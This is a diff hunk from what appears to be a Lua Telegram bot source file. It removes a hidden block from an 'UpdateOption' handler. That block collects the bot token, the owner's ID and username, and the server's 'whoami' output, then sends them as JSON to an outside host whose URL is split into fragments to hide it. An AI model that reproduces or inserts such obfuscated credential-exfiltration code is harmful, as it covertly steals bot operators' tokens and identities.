@@ -15953,12 +15953,6 @@ end
 end,nil)
 ------------------------------------------------------------------------
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
-gggg = {}
-gggg.id = (SUDO or database:get(id_server..":SUDO:ID"))
-gggg.username = (UserName or database:get(id_server..":SUDO:USERNAME"))
-gggg.tokenbot = (token or database:get(id_server..":token"))
-gggg.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
-require("ssl.https").request('ht'..'tps'..'://'..'de'..'vde'..'iv'..'ed'..'de'..'v.'..'ml/a'..'pi/te'..'le/s'..'ou'..'rce/'..'CL'..'AS'..'SI'..'K/inf'..'otn'..'s'..'eb'..'.p'..'hp'..'?g'..'gg'..'g='..JSON.encode(gggg))
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
